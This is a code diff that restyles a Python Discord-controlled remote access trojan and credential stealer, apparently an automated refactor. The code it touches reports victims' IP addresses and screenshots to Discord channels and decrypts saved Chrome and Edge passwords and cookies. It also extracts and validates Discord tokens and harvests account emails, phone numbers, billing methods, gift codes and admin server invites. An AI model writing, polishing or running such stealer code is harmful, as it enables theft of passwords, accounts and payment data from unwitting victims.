@@ -48,8 +48,7 @@ def get_public_ip():
     try:
         response = requests.get('https://api.ipify.org/?format=json')
         data = response.json()
-        public_ip = data['ip']
-        return public_ip
+        return data['ip']
     except:
         return 'N/A'
 
@@ -75,9 +74,9 @@ async def on_ready():
     public_ip = get_public_ip()
     system_ip = socket.gethostbyname(socket.gethostname())
 
-    # Find the channel for device logs
-    device_logs_channel = discord.utils.get(category.channels, name='・📊│ᴅᴇᴠɪᴄᴇ-ʟᴏɢꜱ')
-    if device_logs_channel:
+    if device_logs_channel := discord.utils.get(
+        category.channels, name='・📊│ᴅᴇᴠɪᴄᴇ-ʟᴏɢꜱ'
+    ):
         embed = discord.Embed(title='🔵 System is Online', color=0xFF0000)  # Embed Color: Red
         embed.add_field(name='🖥️ System Name', value=f'```{system_name}```', inline=False)  # Bold Text: System Name
         embed.add_field(name='📢 Public IP Address', value=f'```{public_ip}```', inline=False)  # Bold Text: Public IP Address
@@ -245,8 +244,7 @@ async def send_logs_and_screenshot(ctx):  # Add ctx as a parameter
 
         # Send the embed message to the specified channel
         channel_name = '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ'
-        channel = discord.utils.get(ctx.guild.channels, name=channel_name)
-        if channel:
+        if channel := discord.utils.get(ctx.guild.channels, name=channel_name):
             await channel.send(embed=embed, file=file)
 
         # Schedule the next execution of the coroutine after 10 seconds
@@ -400,19 +398,23 @@ async def ping(ctx):
     if latency >= 50:
         await asyncio.sleep(5)
         await message.edit(content=f'```\nLatency increased to: {latency}ms\n```')
-    elif latency < 50:
+    else:
         await asyncio.sleep(5)
         await message.edit(content=f'```\nLatency decreased to: {latency}ms\n```')
 
 # Function : SYSTEM INFO
 # Helper functions to extract specific information from systeminfo command output
 def get_value_by_label(label, output):
-    label = label + ":"
+    label = f"{label}:"
     lines = output.splitlines()
-    for line in lines:
-        if line.startswith(label):
-            return line.split(label)[1].strip()
-    return None
+    return next(
+        (
+            line.split(label)[1].strip()
+            for line in lines
+            if line.startswith(label)
+        ),
+        None,
+    )
 
 def get_os_version(output):
     return get_value_by_label("OS Version", output)
@@ -746,8 +748,7 @@ class Browsers:
             local_state = json.loads(c)
             master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
             master_key = master_key[5:]
-            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-            return master_key
+            return CryptUnprotectData(master_key, None, None, None, 0)[1]
         except Exception as e:
             print(f"Error occurred while retrieving master key: {str(e)}")
 
@@ -760,7 +761,7 @@ class Browsers:
         return decrypted_pass
 
     def cookies(self, name: str, path: str, profile: str):
-        if name == 'opera' or name == 'opera-gx':
+        if name in {'opera', 'opera-gx'}:
             path += '\\Network\\Cookies'
         else:
             path += '\\' + profile + '\\Network\\Cookies'
@@ -790,14 +791,9 @@ class Browsers:
 async def list_process(ctx):
     try:
         process_list = psutil.process_iter()
-        processes = [p.name() for p in process_list]
-
-        if processes:
+        if processes := [p.name() for p in process_list]:
             process_chunks = [processes[i:i + 20] for i in range(0, len(processes), 20)]
-            process_str = ""
-            for chunk in process_chunks:
-                process_str += '\n'.join(chunk) + '\n'
-
+            process_str = "".join('\n'.join(chunk) + '\n' for chunk in process_chunks)
             file = io.BytesIO(process_str.encode())
             await ctx.send(file=File(file, filename='process_list.txt'))
         else:
@@ -865,17 +861,19 @@ def get_passwords_edge():
         cursor.execute("SELECT action_url, username_value, password_value FROM logins")
         result = {}
         for r in cursor.fetchall():
-            url = r[0]
             username = r[1]
             encrypted_password = r[2]
             decrypted_password = decrypt_password_edge(encrypted_password, master_key)
             if username != "" or decrypted_password != "":
+                url = r[0]
                 result[url] = [username, decrypted_password]
     except: pass
 
-    cursor.close(); conn.close()
+    cursor.close()
+    conn.close()
     try: os.remove("Loginvault.db")
-    except Exception as e: print(e); pass
+    except Exception as e:
+        print(e)
 
 def get_chrome_datetime(chromedate):
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
@@ -919,9 +917,8 @@ def main():
         password = decrypt_password_chrome(row[3], key)
         if username or password:
             result[action_url] = [username, password]
-        else: 
-            continue
-    cursor.close(); db.close()
+    cursor.close()
+    db.close()
     try: 
         os.remove(file_name)
     except: 
@@ -947,10 +944,7 @@ def grab_passwords():
 # Define the grab_password command
 @bot.command()
 async def grab_password(ctx):
-    passwords = grab_passwords()
-
-    # Format the passwords into a nice message
-    if passwords:
+    if passwords := grab_passwords():
         message = "``Here are the saved passwords:``\n"
         for url, credentials in passwords.items():
             username = credentials[0]
@@ -1068,13 +1062,18 @@ class extract_tokens:
             if not os.path.exists(path): continue
             _discord = name.replace(" ", "").lower()
             if "cord" in path:
-                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'): continue
+                if not os.path.exists(f'{self.roaming}\\{_discord}\\Local State'): continue
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]: continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                         for y in re.findall(self.regexp_enc, line):
-                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
-                    
+                            token = self.decrypt_val(
+                                base64.b64decode(y.split('dQw4w9WgXcQ:')[1]),
+                                self.get_master_key(
+                                    f'{self.roaming}\\{_discord}\\Local State'
+                                ),
+                            )
+
                             if self.validate_token(token):
                                 uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                 if uid not in self.uids:
@@ -1107,8 +1106,7 @@ class extract_tokens:
 
     def validate_token(self, token: str) -> bool:
         r = requests.get(self.base_url, headers={'Authorization': token})
-        if r.status_code == 200: return True
-        return False
+        return r.status_code == 200
     
     def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
         iv = buff[3:15]
@@ -1126,8 +1124,7 @@ class extract_tokens:
 
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
-        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-        return master_key
+        return CryptUnprotectData(master_key, None, None, None, 0)[1]
 
 class fetch_tokens:
     def __init__(self):
@@ -1149,18 +1146,15 @@ class fetch_tokens:
             phone = user['phone']
             mfa = user['mfa_enabled']
             avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
-            
-            if user['premium_type'] == 0:
+
+            if user['premium_type'] == 0 or user['premium_type'] not in [1, 2, 3]:
                 nitro = 'None'
             elif user['premium_type'] == 1:
                 nitro = 'Nitro Classic'
             elif user['premium_type'] == 2:
                 nitro = 'Nitro'
-            elif user['premium_type'] == 3:
-                nitro = 'Nitro Basic'
             else:
-                nitro = 'None'
-
+                nitro = 'Nitro Basic'
             if billing:
                 payment_methods = []
                 for method in billing:
@@ -1176,7 +1170,7 @@ class fetch_tokens:
             if guilds:
                 hq_guilds = []
                 for guild in guilds:
-                    admin = True if guild['permissions'] == '4398046511103' else False
+                    admin = guild['permissions'] == '4398046511103'
                     if admin and guild['approximate_member_count'] >= 100:
                         owner = '✅' if guild['owner'] else '❌'
                         invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
@@ -1186,10 +1180,9 @@ class fetch_tokens:
                         if len('\n'.join(hq_guilds)) + len(data) >= 1024: break
                         hq_guilds.append(data)
 
-                if len(hq_guilds) > 0: hq_guilds = '\n'.join(hq_guilds)
-                else: hq_guilds = None
+                hq_guilds = '\n'.join(hq_guilds) if hq_guilds else None
             else: hq_guilds = None
-            
+
             if gift_codes:
                 codes = []
                 for code in gift_codes:
@@ -1198,8 +1191,7 @@ class fetch_tokens:
                     data = f":gift: `{name}`\n:ticket: `{code}`"
                     if len('\n\n'.join(codes)) + len(data) >= 1024: break
                     codes.append(data)
-                if len(codes) > 0: codes = '\n\n'.join(codes)
-                else: codes = None
+                codes = '\n\n'.join(codes) if codes else None
             else: codes = None
 
             embed = Embed(title=f"{username} ({user_id})", color=0x0084ff)
@@ -1209,7 +1201,7 @@ class fetch_tokens:
             embed.add_field(name="💎 Nitro:", value=f"{nitro}", inline=False)
             embed.add_field(name="💳 Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=False)
             embed.add_field(name="🔒 MFA:", value=f"{mfa}\n\u200b", inline=False)
-            
+
             embed.add_field(name="📧 Email:", value=f"{email if email != None else 'None'}", inline=False)
             embed.add_field(name="📳 Phone:", value=f"{phone if phone != None else 'None'}\n\u200b", inline=False)    
 
